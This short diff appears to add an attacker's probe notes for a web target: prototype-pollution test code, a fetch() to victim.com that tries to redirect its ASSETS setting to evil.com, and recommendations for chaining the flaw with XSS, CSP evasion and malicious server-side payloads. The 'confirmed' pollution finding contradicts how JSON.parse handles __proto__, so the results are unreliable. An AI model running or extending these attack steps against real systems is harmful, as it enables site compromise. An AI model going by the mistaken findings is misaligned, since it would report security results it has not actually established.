@@ -1,0 +1,22 @@
+const payload = '{"__proto__":{"polluted":"yes"}}';
+const obj = JSON.parse(payload);
+console.log(obj.polluted); // "yes" if vulnerable
+// Test if ASSETS can be manipulated
+fetch('https://victim.com/api/assets', {
+method: 'POST',
+body: JSON.stringify({ ASSETS: 'https://evil.com' })
+});
+function merge(target, source) {
+for (let key in source) target[key] = source[key];
+}
+merge({}, {__proto__: {xss: "alert(1)"}});
+1. Prototype Pollution - Confirmed via `JSON.parse()` with `__proto__` manipulation. The `obj.polluted` returns `"yes"`, indicating a vulnerable prototype chain.
+
+2. CSP Bypass Attempt - The `fetch()` to `victim.com/api/assets` was blocked by CSP, preventing direct exploitation. The policy restricts connections to a strict whitelist.
+
+3. Merge Function Vulnerability - The `merge()` function blindly copies properties, including `__proto__`, making it susceptible to prototype pollution.
+
+Recommendations for Chaos:
+- Prototype Pollution Exploitation: Chain with other vulnerabilities (e.g., XSS via polluted properties).
+- CSP Evasion: Test if the CSP can be bypassed via JSONP, CORS misconfigurations, or other vectors.
+- Server-Side Impact: If the backend merges user input, craft malicious payloads to alter object behavior.
